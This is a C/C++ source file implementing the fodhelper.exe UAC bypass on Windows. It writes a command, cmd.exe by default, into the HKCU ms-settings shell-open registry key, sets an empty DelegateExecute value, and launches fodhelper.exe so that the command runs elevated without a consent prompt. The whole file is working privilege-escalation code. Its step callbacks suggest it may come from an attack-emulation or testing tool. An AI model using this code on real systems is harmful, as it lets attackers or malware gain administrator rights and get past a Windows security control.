#include "pch.h"
#include "FodHelperAbuseEscalationUtils.h"

#include <shellapi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

#define STEP(cb, name, idx) if ((cb) != NULL) (cb)(name, idx)

int FodHelperAbuseEscalationInternal(const char* execPath, StepCallback callback) {
    HKEY hkey;
    DWORD d;
    const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* defaultExec = "C:\\Windows\\System32\\cmd.exe";
    const char* target = (execPath != NULL && execPath[0] != '\0') ? execPath : defaultExec;
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "%s", target);
    const char* del = "";

    LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    if (stat != ERROR_SUCCESS) {
        printf("FAILED TO OPEN OR CREATE REG KEY\n");
    } else {
        printf("succesfully created reg key\n");
        STEP(callback, "RegCreateKeyExA", 0);
    }

    stat = RegSetValueExA(hkey, NULL, 0, REG_SZ, (const BYTE*)cmd, (DWORD)strlen(cmd) + 1);
    if (stat != ERROR_SUCCESS) {
        printf("FAILED TO SET REG VALUE\n");
    } else {
        printf("succesfully set reg value\n");
        STEP(callback, "RegSetValueExA", 1);
    }

    stat = RegSetValueExA(hkey, "DelegateExecute", 0, REG_SZ, (const BYTE*)del, (DWORD)strlen(del) + 1);
    if (stat != ERROR_SUCCESS) {
        printf("FAILED TO SET REG VALUE\n");
    } else {
        printf("succesfully set reg value\n");
        STEP(callback, "RegSetValueExA", 2);
    }

    RegCloseKey(hkey);

    SHELLEXECUTEINFO shellExecuteInfo = { sizeof(shellExecuteInfo) };
    shellExecuteInfo.cbSize = sizeof(shellExecuteInfo);
    shellExecuteInfo.lpVerb = L"runas";
    shellExecuteInfo.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    shellExecuteInfo.hwnd = NULL;
    shellExecuteInfo.nShow = SW_NORMAL;

    if (!ShellExecuteEx(&shellExecuteInfo)) {
        DWORD error = GetLastError();
        printf(error == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", error);
    } else {
        printf("Successfully created the process =^..^=\n");
        STEP(callback, "ShellExecuteEx", 3);
    }

    return 0;
}
